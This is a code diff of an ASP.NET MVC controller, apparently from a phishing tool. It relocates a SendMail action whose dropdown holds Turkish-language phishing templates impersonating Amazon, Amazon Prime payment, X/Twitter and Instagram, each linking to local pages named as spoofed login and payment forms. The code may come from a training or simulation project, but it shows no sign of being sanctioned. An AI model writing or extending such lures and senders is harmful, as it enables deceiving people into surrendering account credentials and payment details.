@@ -6,7 +6,6 @@ using System.Web.Mvc;
 using System.Collections.Generic;
 using System.Web.UI.WebControls;
 using WebApplicationMVC2.Models;
-using System.Web.UI;
 using System.Linq;
 using System.Threading.Tasks;
 using System.Data.Entity;
@@ -67,31 +66,6 @@ namespace WebApplicationMVC2.Controllers
             return RedirectToAction("Index");
         }
 
-        public ActionResult SendMail()
-        {
-            DropDownViewModel model = new DropDownViewModel
-            {
-                templates = GetDropdownItems(),
-                SelectedItemId = 1
-            };
-
-            return View(model);
-        }
-
-        List<SelectListItem> GetDropdownItems()
-        {
-            var templates = new List<SelectListItem>
-                {
-                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: https://localhost:44327/AmazonLogin/AmazonLogin", Text = "Amazon Login" },
-                    new SelectListItem { Value = "Amazon Prime ayrıcalığı şu anda sadece 1,00 TL! Bu sınırlı süreli kampanyayı kaçırmamak" +
-                    " için linkten ödeme bilgilerinizi doğrulayın -Jeff Bezos: https://localhost:44327/AmazonPayment/AmazonPayment", Text = "Amazon Payment" },
-                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: https://localhost:44327/Twitter/Twitter", Text = "Twitter Login" },
-                    new SelectListItem { Value = "Dikkat! birisi size ait olan instagram hesabına erişmeye çalışıyor olabilir." +
-                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: https://localhost:44327/Instagram/Instagram", Text = "Instagram Login" }
-                };
-            return templates;
-        }
-
         [HttpPost]
         public async Task<ActionResult> SendMail(List<string> recipients, string subject, string message, HttpPostedFileBase attachment)
         {
@@ -141,5 +115,32 @@ namespace WebApplicationMVC2.Controllers
 
             return View(model);
         }
+
+        public ActionResult SendMail()
+        {
+            DropDownViewModel model = new DropDownViewModel
+            {
+                templates = GetDropdownItems(),
+                SelectedItemId = 1
+            };
+
+            return View(model);
+        }
+
+        List<SelectListItem> GetDropdownItems()
+        {
+            var templates = new List<SelectListItem>
+                {
+                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: https://localhost:44327/AmazonLogin/AmazonLogin", Text = "Amazon Login" },
+                    new SelectListItem { Value = "Amazon Prime ayrıcalığı şu anda sadece 1,00 TL! Bu sınırlı süreli kampanyayı kaçırmamak" +
+                    " için linkten ödeme bilgilerinizi doğrulayın -Jeff Bezos: https://localhost:44327/AmazonPayment/AmazonPayment", Text = "Amazon Payment" },
+                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: https://localhost:44327/Twitter/Twitter", Text = "Twitter Login" },
+                    new SelectListItem { Value = "Dikkat! birisi size ait olan instagram hesabına erişmeye çalışıyor olabilir." +
+                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: https://localhost:44327/Instagram/Instagram", Text = "Instagram Login" }
+            //insert templates here    
+            }; 
+            return templates;
+        }
+
     }
 }
